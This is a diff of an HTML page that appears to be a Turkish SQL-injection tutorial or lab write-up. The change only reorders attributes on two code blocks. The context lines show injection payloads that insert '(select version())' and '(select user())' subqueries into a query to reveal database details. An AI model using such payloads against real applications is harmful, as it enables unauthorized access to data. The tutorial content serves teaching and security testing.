@@ -86,13 +86,13 @@
 </code></pre>
 <p>Artık <strong>SQL injection</strong> yapabiliriz.</p>
 <p>Versiyon bilgisini alalım ilk olarak</p>
-<pre style="background-color:#fdf6e3;" lang="sql"><code>
+<pre lang="sql" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">test</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select version()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
 </span>
 </code></pre>
 <p><img src="6.png" alt="" /></p>
 <p>Sonra kullanıcı bilgisini</p>
-<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
 <span style="color:#657b83;">aciklama</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select user()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
 </span>
 </code></pre>
